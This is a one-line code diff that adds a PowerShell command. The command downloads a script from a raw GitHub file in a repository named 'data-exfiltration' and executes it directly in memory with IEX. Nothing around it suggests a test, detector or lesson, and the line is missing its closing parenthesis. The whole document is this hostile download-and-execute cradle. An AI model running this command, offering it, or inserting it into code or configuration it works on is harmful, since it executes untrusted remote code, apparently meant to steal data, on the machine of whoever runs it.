@@ -1,0 +1,1 @@
+powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/eternal-red/data-exfiltration/main/powershell.txt'
